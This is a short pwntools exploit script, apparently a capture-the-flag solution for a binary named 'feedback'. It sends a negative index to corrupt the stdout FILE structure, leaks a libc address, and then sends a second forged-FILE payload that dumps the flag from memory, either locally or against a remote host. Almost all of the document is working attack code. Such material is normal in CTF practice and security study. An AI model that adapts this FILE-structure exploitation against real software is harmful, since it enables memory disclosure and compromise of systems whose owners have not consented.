from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./feedback")
    
else:
    host = "172.20.10.8:38514"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug("./feedback")
    pass
libc = ELF('./libc-2.31.so')
r.sendafter(b'write?\n',b'-8')
r.sendlineafter(b'feedback.\n',p64(0xfbad1800)+p64(0x0)*3+b'\x00')
_IO_2_1_stdin_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
info(f'_IO_2_1_stdin_ -> {hex(_IO_2_1_stdin_addr)}')


# flag_addr = 0x7f511f4e6700


libc.address = _IO_2_1_stdin_addr - libc.sym['_IO_2_1_stdin_']
flag_addr = libc.sym['puts'] + 0x16D2E0
flag_size = 0x50
info(f'flag_addr -> {hex(flag_addr)}')
info(f'puts -> {hex(libc.sym["puts"])}')

time.sleep(2)
# pause()
r.send(b'-8')
payload = p64(0xfbad1800)+p64(0x0)*3 + p64(flag_addr) + p64(flag_addr + flag_size)
r.sendlineafter(b'feedback.',payload)
info(r.recvuntil(b'\x00')[:-1])

